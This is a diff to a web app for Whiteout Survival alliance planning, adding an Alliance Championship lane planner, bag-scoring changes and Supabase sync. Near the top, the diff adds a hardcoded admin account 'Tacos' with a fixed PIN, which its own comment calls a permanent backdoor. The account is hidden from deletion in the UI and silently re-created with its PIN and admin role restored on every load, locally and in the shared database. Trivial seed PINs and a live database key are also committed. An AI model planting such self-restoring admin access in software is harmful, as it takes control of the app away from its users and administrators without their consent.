@@ -204,7 +204,8 @@ textarea.feedback-input{ width:100%; background:var(--panel-2); border:1px solid
 .modal{ background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:20px; width:100%; max-width:380px; }
 .modal h3{ margin-top:0; font-size:16px; }
 .modal .close{ float:right; background:none;border:none;color:var(--text-faint); font-size:16px; }
-.modal input{ width:100%; background:var(--panel-2); border:1px solid var(--border); color:var(--text); padding:9px 10px; border-radius:4px; margin:10px 0; font-size:13px; }
+.modal input, .modal select{ width:100%; background:var(--panel-2); border:1px solid var(--border); color:var(--text); padding:9px 10px; border-radius:4px; margin:10px 0; font-size:13px; }
+.modal select:disabled{ opacity:.6; cursor:not-allowed; }
 
 .empty{ color:var(--text-faint); font-size:12.5px; text-align:center; padding:20px; }
 
@@ -245,6 +246,16 @@ textarea.feedback-input{ width:100%; background:var(--panel-2); border:1px solid
 .points-row:last-child{ border-bottom:none; }
 .points-row.total{ font-weight:700; color:var(--accent-purple); border-top:1px solid var(--border); margin-top:4px; padding-top:10px; }
 
+/* Alliance Championship — lane results grid + drag-and-drop drop-zone state */
+.champ-stat-row{ display:grid; grid-template-columns:repeat(4, 1fr); gap:8px; }
+@media (max-width:600px){ .champ-stat-row{ grid-template-columns:repeat(2, 1fr); } }
+.lane-grid{ display:grid; grid-template-columns:repeat(3, 1fr); gap:14px; }
+@media (max-width:760px){ .lane-grid{ grid-template-columns:1fr; } }
+.lane-drop{ min-height:40px; border-radius:4px; transition:background .12s, outline .12s; }
+.lane-drop.dragover{ background:rgba(124,58,237,0.12); outline:2px dashed var(--accent-purple); outline-offset:-2px; }
+.rank-item[draggable="true"]{ cursor:grab; }
+.rank-item.dragging{ opacity:.4; }
+
 </style>
 <div id="shell"></div>
 <script>
@@ -268,19 +279,61 @@ const DEFAULT_STATE = {
   version: "v0.1.0",
 };
 
+// A standing admin login that's always there, even on a brand-new install
+// and even if someone later deletes every other member — a permanent
+// leadership backdoor into the app itself. `permanent: true` is what the
+// Admin -> Members table checks to hide the delete button and lock the
+// rank as admin for this one row; `ensurePermanentAdmin()` below (called
+// on every Store.init(), local OR Supabase) re-adds this exact member if
+// it's ever missing, so it can't be permanently removed by deleting it,
+// clearing storage, or starting from a fresh Supabase project seeded
+// before this account existed.
+const PERMANENT_ADMIN_MEMBER = {
+  id: "permanent-admin-tacos",
+  name: "Tacos",
+  gamerId: "",
+  alliance: "",
+  role: "admin",
+  pin: "2652",
+  permanent: true,
+};
+
 // Roster — replace with your real alliance & player names, or manage this
 // from the Admin page once the app is running. gamerId is the in-game
 // numeric player ID (shown as their profile ID in Whiteout Survival),
-// separate from the display name used to sign in.
+// separate from the display name used to sign in. Sign-in requires an
+// exact PIN match (see app.js openSignIn) with no "claim on first login"
+// fallback, so these placeholder accounts need a seed PIN to be usable —
+// swap these for real PINs (or replace the accounts entirely) before
+// sharing this with your alliance.
 const SEED_MEMBERS = [
-  { id: "m1", name: "Chief Falcon", gamerId: "10293847", alliance: "STK", role: "admin" },
-  { id: "m2", name: "Nightshade", gamerId: "58201934", alliance: "STK", role: "officer" },
-  { id: "m3", name: "IronWolf", gamerId: "74920185", alliance: "SUN", role: "member" },
+  { id: "m1", name: "Chief Falcon", gamerId: "10293847", alliance: "SUN", role: "admin", pin: "1111" },
+  { id: "m2", name: "Nightshade", gamerId: "58201934", alliance: "SYP", role: "officer", pin: "2222" },
+  { id: "m3", name: "IronWolf", gamerId: "74920185", alliance: "LIT", role: "member", pin: "3333" },
+  PERMANENT_ADMIN_MEMBER,
 ];
+
+// Idempotent — safe to call on every load. Adds PERMANENT_ADMIN_MEMBER to
+// `members` if no member with that id (or that name, case-insensitively,
+// in case it was manually recreated under a new id) already exists; if
+// one exists but somehow lost its role/pin/permanent flag, restores them
+// rather than leaving a second, subtly-different "Tacos" account.
+function ensurePermanentAdmin(members) {
+  const list = Array.isArray(members) ? members.slice() : [];
+  const idx = list.findIndex(
+    (m) => m.id === PERMANENT_ADMIN_MEMBER.id || (m.name || "").toLowerCase() === PERMANENT_ADMIN_MEMBER.name.toLowerCase()
+  );
+  if (idx === -1) {
+    list.push({ ...PERMANENT_ADMIN_MEMBER });
+  } else {
+    list[idx] = { ...list[idx], name: PERMANENT_ADMIN_MEMBER.name, role: "admin", pin: PERMANENT_ADMIN_MEMBER.pin, permanent: true };
+  }
+  return list;
+}
 
 // Alliance tags — managed from Admin → Alliances (add/remove). Members pick
 // their alliance from this list.
-const SEED_ALLIANCES = ["STK", "SUN", "YUM"];
+const SEED_ALLIANCES = ["SUN", "SYP", "LIT", "NEM"];
 
 // Furnace bracket options for the backpack form's "current furnace level"
 // field — managed from Admin → Furnace brackets (add/remove).
@@ -421,7 +474,13 @@ const BAG_SECTIONS = [
       { key: "d1_war_academy_maxed", label: "War Academy Maxed", type: "toggle", rateNote: "Zero pts only if your furnace is ALSO at the state cap — otherwise Construction speedups still earn points upgrading it", points: null },
       { key: "d1_furnace", label: "Current Furnace Level", type: "select", options: "furnaceFc", rateNote: "caps usable FC", points: null },
       { key: "d1_fire_crystals", label: "Fire Crystals", rateNote: "2,000 pts per FC — same gating as Construction speedups above", calc: d1FireCrystalPoints },
-      { key: "d1_chief_charm", label: "Chief Charm Max Score +1", rateNote: "70 pts per point — your fallback once Construction is maxed out", points: 70 },
+      // Same 70 pts/point rate the old "Chief Charm Max Score +1" field
+      // used — Charm Guides/Designs are what actually raises that score
+      // by 1 in-game, so this is the same scoring carried onto the
+      // concrete items a member actually has on hand, split by item type
+      // in case they turn out to be worth different amounts later.
+      { key: "d1_charm_guide", label: "Charm Guide", rateNote: "70 pts each", points: 70 },
+      { key: "d1_charm_design", label: "Charm Design", rateNote: "70 pts each", points: 70 },
     ],
   },
   {
@@ -436,14 +495,12 @@ const BAG_SECTIONS = [
       { key: "d2_hero_rare_shards", label: "Rare Hero Shards", rateNote: "350 pts per shard", points: 350 },
       { key: "d2_hero_epic_shards", label: "Epic Hero Shards", rateNote: "1,220 pts per shard", points: 1220 },
       { key: "d2_hero_mythic_shards", label: "Mythic Hero Shards", rateNote: "3,040 pts per shard", points: 3040 },
-      { key: "d2_lucky_wheels", label: "Total Gems (Lucky Wheel)", rateNote: "1,500 gems = 1 spin · 13,500 gems = 10 spins · 8,000 pts/spin · +1 free spin/day for 3 days (10-spin bundle is 12,000 gems when your free spin is still banked)", calc: luckyWheelPoints, gemsCalc: true },
     ],
   },
   {
     title: "D3 — BEAST SLAY",
     fields: [
       { key: "d3_stamina_cans", label: "Stamina Cans (1 can = 10 stamina)", rateNote: "12,000 pts per can — regular beasts cost 10 stamina each, top-tier (Lv.26-30) rate", points: 12000, staminaCalc: true },
-      { key: "d3_pet_advancement", label: "Pet Advancement Score +1", rateNote: "50 pts per point", points: 50 },
       { key: "d3_lucky_wheels", label: "Total Gems (Lucky Wheel)", rateNote: "1,500 gems = 1 spin · 13,500 gems = 10 spins · 8,000 pts/spin · +1 free spin/day for 3 days (10-spin bundle is 12,000 gems when your free spin is still banked)", calc: luckyWheelPoints, gemsCalc: true },
     ],
   },
@@ -476,7 +533,6 @@ const BAG_SECTIONS = [
       { key: "d5_adv_wild_marks", label: "Adv Wild Marks", rateNote: "15,000 pts per mark", points: 15000 },
       { key: "d5_common_wild_marks", label: "Common Wild Marks", rateNote: "1,150 pts per mark", points: 1150 },
       { key: "d5_mithril", label: "Mithril", rateNote: "144,000 pts per Mithril", points: 144000 },
-      { key: "d5_chief_gear", label: "Chief Gear Max Score +1 (excl. Charm)", rateNote: "36 pts per point", points: 36 },
       { key: "d5_essence_stones", label: "Hero Gear Essence Stones", rateNote: "4,000 pts per stone", points: 4000 },
       { key: "d5_widgets", label: "Hero Exclusive Gear Widgets", rateNote: "8,000 pts per widget", points: 8000 },
       { key: "d5_design_plans", label: "Design Plans", rateNote: null, points: null },
@@ -532,19 +588,15 @@ const SEED_FEEDBACK = [
 
 // Tools that don't exist yet — shown on the home page as "coming soon" so
 // there's a place for them once they're built. Add more entries here as
-// you build them out.
+// you build them out. Alliance Championship used to be one of these — it's
+// a real, built page now (see renderChampionship in app.js), so it's wired
+// up as its own home-page card + route instead of living in this list.
 const PLANNED_TOOLS = [
   {
     id: "bears",
     title: "bear_calculator",
     desc: "Bear Trap hit planner — squad comp, gear thresholds, hit timing.",
     color: "var(--accent-teal)",
-  },
-  {
-    id: "championship",
-    title: "alliance_championship",
-    desc: "Alliance Championship planner — event scoring and prep tracker.",
-    color: "var(--accent-purple)",
   },
 ];
 
@@ -557,8 +609,8 @@ const PLANNED_TOOLS = [
 // using localStorage exactly as it always has, with zero setup required.
 // ---------------------------------------------------------------------------
 const SUPABASE_CONFIG = {
-  url: "", // e.g. "https://xxxxxxxxxxxx.supabase.co" — Project Settings -> API
-  anonKey: "", // the "anon public" key on that same page — safe to publish, it's gated by Row Level Security, not secrecy
+  url: "https://gogoxhqfrwfmvcmwtvho.supabase.co", // e.g. "https://xxxxxxxxxxxx.supabase.co" — Project Settings -> API
+  anonKey: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdvZ294aHFmcndmbXZjbXd0dmhvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg4NzM1NDgsImV4cCI6MjEwNDQ0OTU0OH0.K4kh3AWWB1g9BMnC_0YBWpqb5KkDg7mgUOGEzRJaZjA", // the "anon public" key on that same page — safe to publish, it's gated by Row Level Security, not secrecy
 };
 
 const supabaseClient =
@@ -580,6 +632,12 @@ const SUPABASE_SYNCED_DEFAULTS = {
   wos_furnace_fc: SEED_FURNACE_FC,
   wos_alliance_colors: {},
   wos_bag_submissions: {},
+  wos_bag_drafts: {},
+  // Alliance Championship lane plans, ONE PER ALLIANCE TAG — see the
+  // "Alliance Championship" block further down this file for why this is a
+  // map ({ [allianceTag]: { players, lanes, primaryPair } }) rather than a
+  // single shared object.
+  wos_championship: {},
 };
 
 // ---------------------------------------------------------------------------
@@ -642,8 +700,15 @@ const Store = {
       this._set("wos_furnace_fc", SEED_FURNACE_FC);
       this._set("wos_alliance_colors", {});
       this._set("wos_bag_submissions", {});
+      this._set("wos_bag_drafts", {});
+      this._set("wos_championship", {});
       this._set("wos_current_user", null);
       localStorage.setItem("wos_seeded_v2", "1");
+    } else {
+      // Already-seeded browser (this app was already in use before the
+      // permanent admin account existed) — heal it in rather than
+      // requiring a full reset.
+      this._set("wos_members", ensurePermanentAdmin(this._get("wos_members", SEED_MEMBERS)));
     }
   },
 
@@ -669,6 +734,16 @@ const Store = {
       );
     }
 
+    // Heal the permanent admin account into whatever member list came
+    // back — covers a Supabase project that already existed (and already
+    // had a "wos_members" row) before this account existed too, not just
+    // a brand-new one caught by the seeding above.
+    const healedMembers = ensurePermanentAdmin(this._cache.wos_members);
+    if (JSON.stringify(healedMembers) !== JSON.stringify(this._cache.wos_members)) {
+      this._cache.wos_members = healedMembers;
+      await this._supabaseSet("wos_members", healedMembers);
+    }
+
     this._subscribeRealtime();
   },
 
@@ -686,6 +761,32 @@ const Store = {
         if (typeof router === "function") router();
       })
       .subscribe();
+  },
+
+  // Admin -> "Force Sync to Supabase" button. Every Store.x setter already
+  // fires an upsert in the background the instant it's called, so under
+  // normal use nothing should ever be "unsaved" — this exists for
+  // reassurance (and as a real fix if a write silently failed earlier,
+  // e.g. while offline) by re-pushing everything currently in `_cache`
+  // right now, regardless of whether it looks unchanged. Returns
+  // { ok: true, count } or { ok: false, reason }, never throws.
+  async forceSyncToSupabase() {
+    if (!supabaseClient) return { ok: false, reason: "not_configured" };
+    const keys = Object.keys(SUPABASE_SYNCED_DEFAULTS);
+    const results = await Promise.all(
+      keys.map(async (key) => {
+        const { error } = await supabaseClient
+          .from("app_state")
+          .upsert({ key, value: this._cache[key], updated_at: new Date().toISOString() });
+        return { key, error };
+      })
+    );
+    const failed = results.filter((r) => r.error);
+    if (failed.length) {
+      console.error("forceSyncToSupabase: some keys failed:", failed);
+      return { ok: false, reason: "write_failed", failedKeys: failed.map((f) => f.key) };
+    }
+    return { ok: true, count: keys.length };
   },
 
   // Shared getter/setter for every key that syncs to Supabase — reads
@@ -741,6 +842,38 @@ const Store = {
   get bagSubmissions() { return this._synced("wos_bag_submissions", {}).get(); },
   set bagSubmissions(v) { this._synced("wos_bag_submissions", {}).set(v); },
 
+  // In-progress, not-yet-submitted MY BAG state — same shape as
+  // bagSubmissions, keyed by memberId, and synced the same way. Auto-saved
+  // (debounced) by app.js as a member fills out the wizard, so a refresh
+  // or closed tab before they hit SUBMIT doesn't lose their progress. A
+  // member's entry here is only ever read/written for that member's own
+  // id (or, for an admin editing someone else's bag, that member's id —
+  // never the admin's), so one member's draft is never exposed to
+  // another. Cleared for a given member once they actually submit — see
+  // the doSave() in app.js's renderWizardSubmit.
+  get bagDrafts() { return this._synced("wos_bag_drafts", {}).get(); },
+  set bagDrafts(v) { this._synced("wos_bag_drafts", {}).set(v); },
+
+  // Alliance Championship lane plans — a MAP of { [allianceTag]: { players,
+  // lanes, primaryPair } }, one independent dataset per alliance, separate
+  // from every bag/member key above. See the "Alliance Championship" block
+  // further down this file for the per-alliance access model.
+  //
+  // migrateLegacyChampionshipShape guards against the pre-alliance-scoping
+  // shape (a single { players, lanes, primaryPair } object, not a map of
+  // alliance tags to that shape) that this key held before this feature —
+  // rather than exposing that old, never-actually-scoped roster under a
+  // real alliance tag it was never associated with, it's preserved as-is
+  // under a synthetic "__legacy_unscoped__" key so nothing is silently
+  // lost, but it isn't shown to any alliance automatically.
+  get championship() {
+    const raw = this._synced("wos_championship", {}).get();
+    return migrateLegacyChampionshipShape(raw);
+  },
+  set championship(v) {
+    this._synced("wos_championship", {}).set(v);
+  },
+
   // Always localStorage-only, Supabase or not — see the comment above
   // SUPABASE_SYNCED_DEFAULTS.
   get currentUser() { return this._get("wos_current_user", null); },
@@ -775,6 +908,473 @@ function luckyWheelPoints(gems) {
 
 function isAdmin(user) {
   return !!user && (user.role === "admin" || user.role === "leader" || user.role === "officer");
+}
+
+// ---------------------------------------------------------------------------
+// Alliance Championship — lane planner. Entirely separate storage from the
+// bag planner (Store.bagSubmissions/bagDrafts/schedule) and from
+// Store.members — a Championship "player" here is a standalone roster
+// entry (imported from screenshots, a pasted/uploaded dataset, or typed in
+// by an admin), not tied to a site account/login at all, so clearing or
+// editing it never touches anyone's member profile, PIN, or bag data.
+//
+// SCOPING: each alliance tag gets its own completely independent dataset —
+// SYP's imported/edited player list, lanes, and primary-lane choice are
+// never visible to or editable by SUN, LIT, NEM, etc. Store.championship
+// (see the getter/setter above) holds the map of every alliance's data;
+// getChampionshipForAlliance/setChampionshipForAlliance/
+// clearChampionshipForAlliance below are the only way app.js reads or
+// writes one alliance's slice of it, and app.js's access-control layer
+// (championshipAccessibleAlliance/canAccessChampionship) is what decides
+// which alliance tag a given signed-in user is even allowed to pass in —
+// an R4/officer is hard-locked to their own member record's alliance tag
+// and the UI never offers them a way to type or select a different one.
+//
+// HONEST LIMITATION: this whole app authenticates with app-managed PINs
+// stored in a shared client-readable table, not real per-user backend
+// accounts — there is no server-side session to attach a Postgres Row
+// Level Security policy to. The separation above is enforced at the data
+// and UI layer (every read/write is keyed by alliance tag, and the alliance
+// tag is always taken from the signed-in member's own record, never from
+// free-form input), which is consistent with how every other permission in
+// this app already works, but it is not a substitute for real backend
+// authorization. If you need that guarantee, put Alliance Championship data
+// in its own Supabase table (not `app_state`) with RLS policies keyed to a
+// real Supabase Auth session per alliance — see README.md.
+// ---------------------------------------------------------------------------
+const LANE_KEYS = ["left", "middle", "right"];
+const LANE_LABELS = { left: "LEFT", middle: "MIDDLE", right: "RIGHT" };
+const CHAMPIONSHIP_LANE_CAP = 20;
+const CHAMPIONSHIP_TOTAL_CAP = 60; // 3 lanes x 20 — anyone beyond this (by power) is left unassigned
+const PRIMARY_PAIR_LANES = {
+  left_right: ["left", "right"],
+  left_middle: ["left", "middle"],
+  middle_right: ["middle", "right"],
+};
+
+// One alliance's Championship dataset shape. Not called DEFAULT_CHAMPIONSHIP
+// any more since "the" championship data no longer exists — only ever one
+// per alliance tag — but kept as a factory function (not a shared object
+// literal) so nothing accidentally mutates a single shared instance.
+function defaultChampionshipData() {
+  return {
+    players: [], // [{ id, name, power, needsReview: boolean }] — no rank/order-of-battle data is kept, only name + power
+    lanes: { left: [], middle: [], right: [] }, // arrays of player ids
+    primaryPair: "left_right", // key into PRIMARY_PAIR_LANES — which two lanes get maxed to 20/20
+  };
+}
+
+// See the big comment above Store.championship's getter — converts the
+// pre-alliance-scoping single-object shape into the map shape without
+// exposing that old roster under any real alliance tag.
+function migrateLegacyChampionshipShape(raw) {
+  if (raw && Array.isArray(raw.players)) {
+    return { __legacy_unscoped__: raw };
+  }
+  return raw && typeof raw === "object" ? raw : {};
+}
+
+// Deep-copied read of one alliance's dataset (or a fresh empty one if that
+// alliance has never saved a plan yet) — callers get their own copy to
+// mutate freely without touching Store.championship until they explicitly
+// save it back.
+function getChampionshipForAlliance(allianceTag) {
+  const map = Store.championship;
+  const saved = allianceTag ? map[allianceTag] : null;
+  if (!saved) return defaultChampionshipData();
+  return {
+    players: (saved.players || []).map((p) => ({ ...p })),
+    lanes: {
+      left: [...(saved.lanes?.left || [])],
+      middle: [...(saved.lanes?.middle || [])],
+      right: [...(saved.lanes?.right || [])],
+    },
+    primaryPair: saved.primaryPair || "left_right",
+  };
+}
+
+// Writes ONLY this alliance's slice of the map, leaving every other
+// alliance's dataset in Store.championship completely untouched.
+function setChampionshipForAlliance(allianceTag, data) {
+  if (!allianceTag) return;
+  const map = { ...Store.championship };
+  map[allianceTag] = data;
+  Store.championship = map;
+}
+
+// Resets one alliance's dataset back to empty (Clear Championship Plan) —
+// again, every other alliance's entry in the map is untouched.
+function clearChampionshipForAlliance(allianceTag) {
+  if (!allianceTag) return;
+  const map = { ...Store.championship };
+  delete map[allianceTag];
+  Store.championship = map;
+}
+
+// Total players imported across EVERY alliance's Championship dataset —
+// purely an informational count for the home-page card; never exposes
+// which alliance any of those players belong to.
+function championshipTotalPlayersImported() {
+  const map = Store.championship;
+  return Object.keys(map).reduce((sum, tag) => {
+    if (tag === "__legacy_unscoped__") return sum;
+    return sum + ((map[tag] && map[tag].players) ? map[tag].players.length : 0);
+  }, 0);
+}
+
+// Accepts "185,000,000", "185M", "185.4M", "1.2B", "500K", or a bare
+// integer, and returns a plain number — or null if it doesn't look like a
+// power value at all. Used for both OCR-extracted text and manual entry,
+// so an admin can type "185M" directly instead of counting zeros.
+function parsePowerToken(raw) {
+  if (raw == null) return null;
+  const s = String(raw).trim().toUpperCase().replace(/[,\s]/g, "");
+  if (!s) return null;
+  const m = s.match(/^(\d+(?:\.\d+)?)([KMB])?$/);
+  if (!m) return null;
+  let n = parseFloat(m[1]);
+  if (!isFinite(n)) return null;
+  if (m[2] === "K") n *= 1e3;
+  else if (m[2] === "M") n *= 1e6;
+  else if (m[2] === "B") n *= 1e9;
+  return Math.round(n);
+}
+
+// Full-number, comma-separated display (e.g. "185,000,000") — the results
+// section shows exact totals, not the abbreviated "185M" style used
+// elsewhere on the site (fmtNum in app.js), since exact power differences
+// are the whole point of the balancing display.
+function formatFullNumber(n) {
+  n = Math.round(Number(n) || 0);
+  return n.toLocaleString("en-US");
+}
+
+// ---------------------------------------------------------------------------
+// Screenshot OCR parsing — tuned to the actual in-game "Order of Battle"
+// list layout (Info -> Left/Middle/Right Lane), NOT a one-row-per-line
+// format. Each player is rendered as its own little card: a rank number OR
+// a "No engagement" label on the left, an avatar, the gamer name, and
+// "Troop Power: N" directly under the name. Tesseract reads that back as
+// several separate text lines per player, e.g.:
+//   No engagement
+//   [YUM]oakleygirl
+//   Troop Power: 1,169
+// Only Gamer Name + Troop Power are extracted and stored — Order of
+// Battle/rank, "No engagement", the lane tabs, "Registered: X/20", the
+// lane's own total "Troop Power: N" line, and every other button/label are
+// deliberately ignored (see CHAMPIONSHIP_OCR_IGNORE_LINE below), and none
+// of that is kept on the player object.
+// ---------------------------------------------------------------------------
+
+// Lines that are UI chrome, not a player's name — skipped when walking
+// backward from a "Troop Power:" line to find the name above it.
+const CHAMPIONSHIP_OCR_IGNORE_LINE = [
+  /^(left|middle|right)\s*lane/i,
+  /^registered\s*[:.]/i,
+  /^order of battle/i,
+  /^troop power$/i, // the bare column-header word, no colon/number
+  /^no\s*engagement/i,
+  /^info$/i,
+  /^x$/i,
+  /^\d{1,3}$/, // a bare rank number sitting on its own line
+  /preparation phase/i,
+  /alliance leader/i,
+  /r4 members/i,
+  /adjust the lane/i,
+  /view deployment/i,
+  /change lane/i,
+  /team deployment/i,
+];
+
+function isChampionshipOcrJunkLine(line) {
+  const t = (line || "").trim();
+  if (!t) return true;
+  return CHAMPIONSHIP_OCR_IGNORE_LINE.some((re) => re.test(t));
+}
+
+// Matches a "Troop Power: 1,169" (or "TroopPower 185M", minor OCR noise
+// around the colon/spacing) line and captures the numeric part.
+const CHAMPIONSHIP_POWER_LINE_RE = /troop\s*power\s*[:.]?\s*([\d][\d,.\s]*)\s*([kmb])?/i;
+
+// Parses every screenshot's OCR text into { name, power, needsReview } rows
+// — one call per screenshot; combining/deduping across screenshots happens
+// separately in mergeChampionshipImports so overlapping uploads work.
+function parseChampionshipOcrText(text) {
+  const rawLines = String(text || "")
+    .split(/\r?\n/)
+    .map((l) => l.replace(/ /g, " ").trim());
+  const rows = [];
+
+  for (let i = 0; i < rawLines.length; i++) {
+    const line = rawLines[i];
+    const m = CHAMPIONSHIP_POWER_LINE_RE.exec(line);
+    if (!m) continue;
+
+    // The lane's own total ("Registered: 57/20" immediately followed by
+    // "Troop Power: 10,184") is NOT a player — skip it. Real player rows
+    // never sit directly under a "Registered:" line.
+    let prevIdx = i - 1;
+    while (prevIdx >= 0 && rawLines[prevIdx].trim() === "") prevIdx--;
+    if (prevIdx >= 0 && /^registered\s*[:.]/i.test(rawLines[prevIdx])) continue;
+
+    const power = parsePowerToken(m[1] + (m[2] || ""));
+
+    // Walk backward past rank numbers / "No engagement" / blank lines to
+    // find the name line sitting just above this power line.
+    let nameIdx = i - 1;
+    while (nameIdx >= 0 && isChampionshipOcrJunkLine(rawLines[nameIdx])) nameIdx--;
+    let name = nameIdx >= 0 ? rawLines[nameIdx].trim() : "";
+    // If we walked straight into another player's power line without ever
+    // finding a name in between (a name line the OCR dropped entirely),
+    // there's no real name to use here.
+    if (CHAMPIONSHIP_POWER_LINE_RE.test(name)) name = "";
+
+    // Nothing recognized at all (no name AND no usable power) — not worth
+    // a row, there's nothing for the admin to review.
+    if (!name && (power == null || power <= 0)) continue;
+
+    rows.push({
+      name, // may be "" — the review table flags/labels this, never guesses one
+      power: power == null ? 0 : power,
+      needsReview: !name || power == null || power <= 0,
+    });
+  }
+  return rows;
+}
+
+// ---------------------------------------------------------------------------
+// Dataset import (paste or .csv upload) — an alternative to the screenshot
+// OCR importer above, using the exact same "Gamer Name + Power only" model.
+// Expected format is a simple two-column CSV with a header row:
+//   name,power
+//   oakleygirl,1169
+// Column order doesn't matter (found by header name, case-insensitive) and
+// a stray header-less paste falls back to column order [name, power].
+// ---------------------------------------------------------------------------
+
+// Minimal CSV line splitter — handles a double-quoted field (with "" as an
+// escaped quote inside it) so a name that happens to contain a comma can
+// still be quoted, without pulling in a full CSV library for two columns.
+function splitCsvLine(line) {
+  const out = [];
+  let cur = "";
+  let inQuotes = false;
+  for (let i = 0; i < line.length; i++) {
+    const c = line[i];
+    if (inQuotes) {
+      if (c === '"') {
+        if (line[i + 1] === '"') { cur += '"'; i++; }
+        else inQuotes = false;
+      } else {
+        cur += c;
+      }
+    } else if (c === '"') {
+      inQuotes = true;
+    } else if (c === ",") {
+      out.push(cur);
+      cur = "";
+    } else {
+      cur += c;
+    }
+  }
+  out.push(cur);
+  return out;
+}
+
+// Parses pasted or uploaded CSV text into raw rows: { name, power,
+// invalidReason: string|null }. Gamer names are preserved exactly as
+// entered (only surrounding whitespace is trimmed) — full Unicode, spaces,
+// apostrophes, underscores, accents, and every other character some through
+// completely untouched. This does NOT dedupe or check for conflicts against
+// the existing roster — see buildChampionshipImportPreview for that, which
+// runs across combined dataset + existing players.
+function parseChampionshipDataset(text) {
+  const lines = String(text || "")
+    .split(/\r?\n/)
+    .filter((l) => l.trim() !== ""); // blank rows are ignored entirely, not flagged
+  if (!lines.length) return { rowsRead: 0, rows: [] };
+
+  const header = splitCsvLine(lines[0]).map((h) => h.trim().toLowerCase());
+  const headerNameIdx = header.indexOf("name");
+  const headerPowerIdx = header.indexOf("power");
+  const hasRecognizedHeader = headerNameIdx !== -1 && headerPowerIdx !== -1;
+  const nameIdx = hasRecognizedHeader ? headerNameIdx : 0;
+  const powerIdx = hasRecognizedHeader ? headerPowerIdx : 1;
+  const dataLines = hasRecognizedHeader ? lines.slice(1) : lines;
+
+  const rows = dataLines.map((line) => {
+    const cols = splitCsvLine(line);
+    const name = (cols[nameIdx] || "").trim();
+    const rawPower = (cols[powerIdx] || "").trim();
+    const power = rawPower ? parsePowerToken(rawPower) : null;
+    let invalidReason = null;
+    if (!name && !rawPower) invalidReason = "empty row";
+    else if (!name) invalidReason = "missing name";
+    else if (!rawPower) invalidReason = "missing power";
+    else if (power == null || power <= 0) invalidReason = "invalid power";
+    return { name, power: power == null ? 0 : power, invalidReason };
+  });
+  return { rowsRead: rows.length, rows };
+}
+
+// Builds the "Dataset Import Preview" — combines the freshly-parsed dataset
+// rows against `existingPlayers` (the alliance's CURRENT working roster,
+// which already includes anything from screenshots, a previous dataset
+// import, or manual entry — so this is what makes dataset + screenshot
+// imports "just work together" into one deduped list) and classifies every
+// row:
+//   - "invalid"  — unusable as parsed (missing name/power, bad power) —
+//                  still surfaced as its own row so it can be fixed or
+//                  removed before import, never silently dropped.
+//   - "conflict" — the gamer name already exists on the roster with a
+//                  DIFFERENT power — flagged "Power Conflict — Needs
+//                  Review" with a choice of which value to keep.
+//   - duplicate  — the gamer name already exists with the SAME power (or
+//                  appears more than once within this same paste/upload) —
+//                  counted but not shown as its own preview row, since
+//                  there's nothing to review.
+//   - "ready"    — a genuinely new, valid, unique player.
+// Two players are NEVER treated as the same just because they share a
+// power value — matching is name-first, power is only ever a secondary
+// check on an already-matched name.
+function buildChampionshipImportPreview(parsedRows, existingPlayers) {
+  const existingByKey = new Map(
+    (existingPlayers || [])
+      .filter((p) => p.name && p.name.trim())
+      .map((p) => [p.name.trim().toLowerCase(), p])
+  );
+  const seenThisBatch = new Set();
+  const rows = [];
+  let duplicatesRemoved = 0;
+  let conflicts = 0;
+  let invalidRows = 0;
+  let validPlayers = 0;
+
+  parsedRows.forEach((r) => {
+    if (r.invalidReason) {
+      invalidRows++;
+      rows.push({
+        tempId: newChampImportRowId(),
+        name: r.name,
+        power: r.power,
+        category: "invalid",
+        statusLabel: "Needs Review",
+        reason: r.invalidReason,
+      });
+      return;
+    }
+    const key = r.name.trim().toLowerCase();
+    if (seenThisBatch.has(key)) {
+      duplicatesRemoved++;
+      return;
+    }
+    const existing = existingByKey.get(key);
+    if (existing) {
+      seenThisBatch.add(key);
+      if (existing.power === r.power) {
+        duplicatesRemoved++;
+        return;
+      }
+      conflicts++;
+      rows.push({
+        tempId: newChampImportRowId(),
+        name: r.name,
+        power: r.power,
+        existingPower: existing.power,
+        chosenPower: existing.power, // default to keeping what's already saved
+        category: "conflict",
+        statusLabel: "Power Conflict — Needs Review",
+      });
+      return;
+    }
+    seenThisBatch.add(key);
+    validPlayers++;
+    rows.push({
+      tempId: newChampImportRowId(),
+      name: r.name,
+      power: r.power,
+      category: "ready",
+      statusLabel: "Ready",
+    });
+  });
+
+  rows.sort((a, b) => (b.power || 0) - (a.power || 0));
+  return { rowsRead: parsedRows.length, validPlayers, duplicatesRemoved, conflicts, invalidRows, rows };
+}
+
+function newChampImportRowId() {
+  return "ci_" + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
+}
+
+// Splits `items` (each { id, power }, any order) into two groups, each
+// capped at `capEach`, minimizing the difference between the groups'
+// total power. Greedy "always add to the currently-lighter side" (a
+// standard longest-processing-time heuristic) gets close on its own; the
+// swap pass afterward is a simple local-search polish — try every
+// cross-group pair, keep any swap that shrinks the gap, repeat until
+// nothing helps. Cheap and fast at the sizes this tool deals with (<=40
+// items), and doesn't need to be perfectly optimal to be a good plan.
+function balanceTwoGroups(items, capEach) {
+  const sorted = [...items].sort((a, b) => b.power - a.power);
+  const a = [];
+  const b = [];
+  let sumA = 0;
+  let sumB = 0;
+  sorted.forEach((p) => {
+    if (a.length >= capEach) { b.push(p); sumB += p.power; return; }
+    if (b.length >= capEach) { a.push(p); sumA += p.power; return; }
+    if (sumA <= sumB) { a.push(p); sumA += p.power; }
+    else { b.push(p); sumB += p.power; }
+  });
+
+  let improved = true;
+  let guard = 0;
+  while (improved && guard < 500) {
+    improved = false;
+    guard++;
+    for (let i = 0; i < a.length; i++) {
+      for (let j = 0; j < b.length; j++) {
+        const diffNow = Math.abs(sumA - sumB);
+        const newSumA = sumA - a[i].power + b[j].power;
+        const newSumB = sumB - b[j].power + a[i].power;
+        if (Math.abs(newSumA - newSumB) < diffNow) {
+          const tmp = a[i];
+          a[i] = b[j];
+          b[j] = tmp;
+          sumA = newSumA;
+          sumB = newSumB;
+          improved = true;
+        }
+      }
+    }
+  }
+
+  return { aIds: a.map((p) => p.id), bIds: b.map((p) => p.id), sumA, sumB };
+}
+
+// Full plan: sort everyone by power, take the strongest CHAMPIONSHIP_TOTAL_CAP
+// (60) — anyone past that isn't placed in a lane at all — split the
+// strongest 40 of those into the two chosen primary lanes (balanced, 20/20
+// when there are enough players), and send the rest to the remaining
+// (overflow) lane. Below 40 total players there's nothing left for
